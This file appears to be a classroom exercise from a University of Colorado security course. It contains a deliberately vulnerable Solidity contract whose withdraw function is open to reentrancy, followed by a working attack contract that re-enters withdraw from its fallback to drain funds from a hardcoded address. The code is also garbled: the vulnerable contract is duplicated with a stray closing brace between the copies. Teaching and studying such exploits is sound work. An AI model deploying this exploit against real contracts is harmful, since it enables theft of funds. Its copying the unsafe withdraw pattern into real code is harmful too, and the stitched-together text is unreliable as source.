pragma solidity ^0.6.0;
//
// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)

contract Vuln {
    mapping(address => uint256) public balances;
    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");
        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

}

contract Vuln {
    mapping(address => uint256) public balances;
    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");
        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack {
    address payable owner;
    Vuln public vuln_wal = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    uint256 public count;

    constructor() public
    {
        owner = msg.sender; 
        count = 0;
    }
    
    function atk() public payable
    {
        if (msg.value >= 0.1 ether)
        {
            vuln_wal.deposit.value(0.1 ether)();
            vuln_wal.withdraw();
        }
    }

    fallback () external payable 
    {
        count++;

        if (count < 8)
        {
            vuln_wal.withdraw();
        }
    }

}
